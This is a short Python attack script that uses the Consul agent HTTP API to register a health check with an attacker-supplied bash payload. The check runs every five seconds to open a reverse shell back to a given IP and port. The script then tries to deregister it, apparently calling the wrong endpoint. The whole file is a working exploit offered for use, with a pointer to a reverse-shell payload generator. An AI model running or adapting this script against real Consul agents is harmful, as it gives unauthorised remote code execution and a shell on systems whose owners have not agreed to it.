# author: adan.alvarez.90@gmail.com
# Description:
#    - Creates a new check in Consul agent to obtain a reverse shell.

import requests
import sys
import argparse
import time
import json

if len(sys.argv) <= 1:
    print('[*] Script to create a new check in Consul agent to obtain a reverse shell')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Consul URL",
                    action='store')
parser.add_argument("-p", "--port",
                    dest="port",
                    help="Port for the reverse shell",
                    action='store')
parser.add_argument("-i", "--ip",
                    dest="ip",
                    help="IP for the reverse shell",
                    action='store')
parser.add_argument("--payload",
                    dest="payload",
                    help="Payload to get the reverse shell (tip: revshells.com)",
                    action="append",
                    nargs=argparse.REMAINDER)

args = parser.parse_args()
url = args.url if args.url else None
ip = args.ip if args.ip else None
port = args.port if args.port else None
payload = args.payload[0]

data = {'ID': 'rc', 'Name': 'Remote code execution',
        'Shell': '/bin/bash', 'Interval': '5s'}
data['Args'] = payload

registerurl = url+"/v1/agent/check/register"
r = requests.put(registerurl, json=data)
time.sleep(5)

desregisterurl = url+"/v1/agent/service/deregister/rc"
r = requests.put(desregisterurl)
